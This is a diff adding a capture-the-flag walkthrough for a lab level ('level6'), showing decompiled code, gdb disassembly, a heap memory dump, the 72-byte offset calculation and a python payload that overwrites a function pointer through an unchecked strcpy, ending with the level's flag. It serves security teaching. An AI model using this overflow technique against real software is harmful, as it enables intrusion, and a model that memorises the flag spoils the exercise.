@@ -1,5 +1,125 @@
+As usual we use scp and Ghidra to decompilate the program.
+scp -r  -P 4242 level6@192.168.56.102:/home/user/level6 .
 
+We have this main :
+void main(undefined4 param_1,int param_2)
 
+{
+  char *__dest;
+  code **ppcVar1;
+  
+  __dest = (char *)malloc(0x40);
+  ppcVar1 = (code **)malloc(4);
+  *ppcVar1 = m;
+  strcpy(__dest,*(char **)(param_2 + 4));
+  (**ppcVar1)();
+  return;
+}
 
+We know that strcpy is vulnerable to buffer overflow because, strcpy don t check the size of the buffer, so we can exploit it.
+We know that dest has 64 bytes (0x40), so if we pass more that 64 in parameter, we will write into the memory (Heap).
+We also know that we have a function n that print the flag for the level7.:
+void n(void)
+
+{
+  system("/bin/cat /home/user/level7/.pass");
+  return;
+}
+We can use this to overwrite the address of the function m, and replace it by n.
+We have to find the address of the function n and, the address of the functions m,
+find the offset between where we write (when we pass a string into param 2) and the address of the function m. 
+Then we can overwrite the address of the function m by the address of the function n.
+
+1) We start gdb and put a breakpoint before the return of the main function.
+
+gdb ./level6
+disas main
+Dump of assembler code for function main:
+   0x0804847c <+0>:	push   %ebp
+   0x0804847d <+1>:	mov    %esp,%ebp
+   0x0804847f <+3>:	and    $0xfffffff0,%esp
+   0x08048482 <+6>:	sub    $0x20,%esp
+   0x08048485 <+9>:	movl   $0x40,(%esp)
+   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
+   0x08048495 <+25>:	movl   $0x4,(%esp)
+   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
+   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
+   0x080484a5 <+41>:	mov    $0x8048468,%edx
+   0x080484aa <+46>:	mov    0x18(%esp),%eax
+   0x080484ae <+50>:	mov    %edx,(%eax)
+   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
+   0x080484b3 <+55>:	add    $0x4,%eax
+   0x080484b6 <+58>:	mov    (%eax),%eax
+   0x080484b8 <+60>:	mov    %eax,%edx
+   0x080484ba <+62>:	mov    0x1c(%esp),%eax
+   0x080484be <+66>:	mov    %edx,0x4(%esp)
+   0x080484c2 <+70>:	mov    %eax,(%esp)
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+   0x080484ca <+78>:	mov    0x18(%esp),%eax
+   0x080484ce <+82>:	mov    (%eax),%eax
+   0x080484d0 <+84>:	call   *%eax                 --> here is a good spot ((**ppcVar1)();)
+   0x080484d2 <+86>:	leave  
+   0x080484d3 <+87>:	ret
+
+   (gdb) break *0x080484d0
+
+2) We run the program with a string we can find easily in the memory, and we look at the memory.
+We can put AAAA like the other levels.
+
+run AAAA
+Starting program: /home/user/level6/level6 AAAA
+
+3) Find the address of m and n :
+info functions
 0x08048454  n
 0x08048468  m
+
+4) Find the offset between the address of m and where we write in the memory.
+x: This is the command in GDB used for examining memory.
+30 indicates the number of units to display. In this case, it will display 30 memory units.
+x specifies the format of the memory units to be displayed. In this case, it will display the memory contents in hexadecimal format.
+
+(gdb) x/30x 0x0804a008
+
+0x804a008:	0x41414141	0x00000000	0x00000000	0x00000000
+0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000
+0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
+0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a078:	0x00000000	0x00000000
+
+Hmmmmm we can see our AAAA : 0x41414141, and the address of m : 0x08048468
+
+Now we count the number of block addresses between the address of m and AAAA :
+We have 18 block addresses between the address of m and AAAA, so we have to write 18 times 4 bytes to reach the address of m.
+= 72 bytes.
+
+5) We can now overwrite the address of m by the address of n.
+We have to convert the address of n in little endian format.
+0x08048454 in little endian format is : /x54/x84/x04/x08
+
+python -c 'print "A"*72 + "\x54\x84\x04\x08"' > /tmp/inject
+
+6) We run the program with the file we just created.
+./level6 "$(cat /tmp/inject)"
+
+(We use "$()" to have /tmp/inject as argument for ./level6)
+
+Other solution To calulate the offset :
+__libc_start_main(0x804847c, 1, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
+malloc(64)                                                                        = 0x0804a008
+malloc(4)                                                                         = 0x0804a050
+strcpy(0x0804a008, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+We see the address of the first malloc (__dest) and the address of the second mallolc (ppcVar1).
+We can calculate the offset between the address of the first malloc and the address of the second malloc.
+We can use python to calculate the offset :
+python -c 'print(abs(0x0804a008 - 0x0804a050))' = 72
+
+7) We have the flag, and go to eat a pizza.
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
